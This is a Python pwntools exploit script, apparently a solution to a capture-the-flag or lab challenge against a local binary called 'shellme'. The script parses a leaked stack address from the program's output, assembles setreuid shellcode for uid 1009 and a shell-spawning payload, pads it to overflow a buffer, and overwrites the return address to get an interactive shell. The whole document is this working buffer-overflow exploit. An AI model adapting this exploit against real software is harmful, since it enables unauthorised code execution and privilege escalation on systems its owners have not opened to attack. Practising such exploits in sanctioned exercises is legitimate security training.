#!/usr/bin/env python3
from pwn import *
import codecs
import os
# set environment
context(arch="amd64", os="linux")

# recvuntil

# receive output of shellme
io = process("./shellme")
io.recvline()
address_line = io.recvline()

# deal with address
rev_add_string = b""
for i in range(len(address_line) - 2, 25, -2):
    rev_add_string += address_line[i - 1].to_bytes(1, 'big') + address_line[i].to_bytes(1, 'big')


byte_string = rev_add_string.decode("utf-8")
reversed_add = codecs.decode(byte_string, 'hex_codec')

# shell code to set uid
payload = asm(shellcraft.setreuid(uid='1009'))

# shell code main body
# build shell code in assembly language
assemblyCode = shellcraft.sh()

# assemble the assembly code
byteCode = asm(assemblyCode)

# build input string
length68 = 0x88 - len(byteCode) - len(payload)
input_bytes = payload + byteCode + b'\x68' * length68 + reversed_add

# send input bytes to shellme
io.sendline(input_bytes)


# interact with bash
io.interactive()
